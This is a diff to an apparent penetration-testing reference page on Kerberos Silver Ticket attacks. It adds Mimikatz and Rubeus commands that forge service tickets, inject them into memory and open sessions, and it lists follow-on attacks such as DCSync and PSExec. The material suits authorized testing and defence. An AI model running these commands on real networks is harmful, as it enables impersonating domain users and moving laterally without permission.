@@ -19,7 +19,10 @@ permalink: /ad/silver/
 
 ## Vulnerability
 
-To lateralize on the network, you can forge Silver Tickets using `Mimikatz`. Silver Ticket attack consists in forging a Kerberos TGS for a service by impersonating any domain user.
+To lateralize on the network, you can forge Silver Tickets using `Mimikatz`. Silver Ticket attack consists in forging a Kerberos TGS for a service by impersonating any domain user. For instance, you can perform following attacks once you will forge required service tickets:
+* [DCSync](/ad/dcsync/): LDAP (on Domain Controllers only).
+* [PSExec](/windows/psexec/): HOST and CIFS.
+* [WinRM](/ad/winrm/): HOST and HTTP.
 
 ## Prerequisites
 
@@ -45,19 +48,23 @@ whoami /user
 
 You can now forge the Silver Ticket and access your target.
 
-```bash
-# With Mimikatz.
-kerberos::golden /sid:$sid /domain:$domain /ptt /target:$hostname /service:http /rc4:$hash /user:$username
+```powershell
+# With Mimikatz or Rubeus.
+kerberos::golden /sid:$sid /domain:$domain /target:$hostname /service:http /rc4:$hash /user:$username
+.\Rubeus.exe silver /service:http/$hostname.$domain /aes256:$hash /user:$username /domain:$domain /sid:$sid /nowrap
 
 # Inject the ticket in memory.
 kerberos::ptt ticket.kirbi
+
+# Or create a dummy session before.
+.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$domain /username:$username /password:$whatever /ticket$Base64EncodedTicket
 ```
 
 You can also use this attack to access an domain computer via SMB by using the machine account SID and its associated hash.
 
 ```bash
 # With Mimikatz.
-kerberos::golden /sid:$sid /domain:$domain /ptt /target:$hostname /service:cifs /rc4:$hash /user:$username
+kerberos::golden /sid:$sid /domain:$domain /target:$hostname /service:cifs /rc4:$hash /user:$username
 ```
 
 {: .warning }
